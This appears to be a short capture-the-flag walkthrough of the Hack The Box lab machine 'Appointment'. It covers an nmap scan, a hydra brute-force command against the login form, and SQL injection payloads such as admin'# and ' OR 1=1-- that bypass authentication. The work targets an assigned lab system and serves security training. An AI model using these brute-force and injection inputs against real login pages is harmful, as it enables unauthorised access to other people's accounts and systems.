# Appointment

*Difficulty:* Easy  
*OS:* Linux

## Overview

This machine focuses on SQL injection vulnerabilities. The target runs a website with a login page backed by a database that doesn't properly sanitize user input.

## Reconnaissance

Target IP: 10.129.252.144 (assigned by HTB)
Upon visiting the IP in the browser, I was presented with a login form requesting a username and password

![image](https://github.com/user-attachments/assets/00dd5d1b-12be-4a6e-89c3-0558b86ffe02)


## Enumeration

I have run a quick scan on the Following target by using "Nmap to verify the open ports and find services/versions info" and here are my findings:
_nmap -sC -sV -oN nmap.txt 10.129.252.144_

-sC: runs default scripts
-sV: detects service versions

![image](https://github.com/user-attachments/assets/b841eb25-1fae-45c0-88a0-554919e43243)

The port 80 is open, running "Apache httpd 2.4.38"

## Exploitation

hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/wordlists/Passwords/Common-Credentials/10k-most-common.txt \
      10.129.252.144 http-post-form "/index.php:username=^USER^&password=^PASS^:Invalid username or password"
![image](https://github.com/user-attachments/assets/61386209-f121-4b50-90b0-b9c20f6e5ec1)

Suspecting SQL injectio, I tested various payloads manually in the username field, such as < admin'#
admin'-- 
' OR 1=1-- >

Eventually, the combination:
Username: admin'#
Password: abc123


## Post-Exploitation

After successfully logging in using the SQLi bypass, I gained access to the authenticated portion of the web application:
![image](https://github.com/user-attachments/assets/333264ce-b95f-4836-8091-ec0f26fb33a4)


## Lessons Learned

Understanding of SQL injection in login forms.
Hands-on experience with Hydra.
Practiced critical thinking and manual testing techniques.

## References

https://github.com/danielmiessler/SecLists
https://github.com/vanhauser-thc/thc-hydra
https://portswigger.net/web-security/sql-injection/cheat-sheet
